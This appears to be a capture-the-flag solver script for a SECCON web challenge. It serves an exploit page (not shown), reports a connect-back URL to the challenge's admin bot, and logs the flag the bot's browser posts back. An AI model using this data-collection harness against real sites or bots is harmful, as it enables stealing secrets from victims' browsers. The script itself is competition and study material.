import fastify from "fastify";
import assert from "node:assert/strict";
import fs from "node:fs/promises";

const BOT_BASE_URL = `http://${process.env.SECCON_HOST ?? "localhost"}:1337`;
const CONNECTBACK_URL = process.env.CONNECTBACK_URL ?? assert.fail("No URL");
const PORT = "8080";

const app = fastify();

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const reportUrl = (url) =>
  fetch(`${BOT_BASE_URL}/api/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url }),
  }).then((r) => r.text());

app.get("/", async (req, reply) => {
  const html = await fs.readFile("index.html");
  reply.type("text/html; charset=utf-8").send(html);
});

app.post("/", async (req, reply) => {
  // You got a flag!
  console.log(req.body);
  process.exit(0);
});

app.listen({ port: PORT, host: "0.0.0.0" }, async (err) => {
  if (err) assert.fail(err.toString());

  await sleep(3 * 1000);
  await reportUrl(
    `${CONNECTBACK_URL}?${new URLSearchParams({
      baseUrl: "http://web:3000",
    })}`
  );

  await sleep(5 * 1000);
  assert.fail("Failed");
});
